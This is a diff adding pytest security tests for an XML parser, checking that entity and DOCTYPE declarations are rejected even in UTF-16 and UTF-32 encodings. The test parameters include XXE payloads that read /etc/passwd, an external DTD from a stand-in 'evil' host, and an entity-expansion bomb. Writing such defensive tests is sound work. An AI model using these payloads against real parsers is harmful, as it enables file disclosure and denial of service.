@@ -84,6 +84,49 @@ def test_parse_xml_file_rejects_late_prohibited_declaration(tmp_path) -> None:
     assert "XML input" in str(exc_info.value)
 
 
+@pytest.mark.parametrize("encoding", ["utf-16", "utf-16-le", "utf-16-be", "utf-32"])
+@pytest.mark.parametrize(
+    "declaration",
+    [
+        '<!DOCTYPE Values [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
+        '<!DOCTYPE Values SYSTEM "http://example.invalid/evil.dtd">',
+        '<!DOCTYPE Values [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;&a;">]>',
+    ],
+)
+def test_parse_xml_file_rejects_declarations_in_any_encoding(
+    tmp_path, encoding: str, declaration: str
+) -> None:
+    unsafe = tmp_path / "wide.xml"
+    declared = "UTF-32" if encoding == "utf-32" else "UTF-16"
+    text = (
+        f'<?xml version="1.0" encoding="{declared}"?>\n{declaration}\n'
+        '<Values version="2.0"><value name="x">safe</value></Values>\n'
+    )
+    data = text.encode(encoding)
+    if encoding.endswith(("-le", "-be")):
+        data = "﻿".encode(encoding) + data  # a BOM, as editors write it
+    unsafe.write_bytes(data)
+    assert b"<!doctype" not in data.lower()  # the byte check alone would let it through
+
+    with pytest.raises(XmlSecurityError) as exc_info:
+        parse_xml_file(unsafe)
+
+    assert str(unsafe) not in str(exc_info.value)
+    assert "XML input" in str(exc_info.value)
+
+
+def test_parse_xml_file_accepts_utf16_without_declarations(tmp_path) -> None:
+    wide = tmp_path / "wide.xml"
+    wide.write_bytes(
+        '<?xml version="1.0" encoding="UTF-16"?>\n'
+        '<Values version="2.0"><value name="x">safe</value></Values>\n'.encode("utf-16")
+    )
+
+    root = parse_xml_file(wide)
+
+    assert root.tag == "Values"
+
+
 def test_parse_xml_file_rejects_malformed_xml(tmp_path) -> None:
     malformed = tmp_path / "malformed.xml"
     malformed.write_text("<Values>", encoding="utf-8")
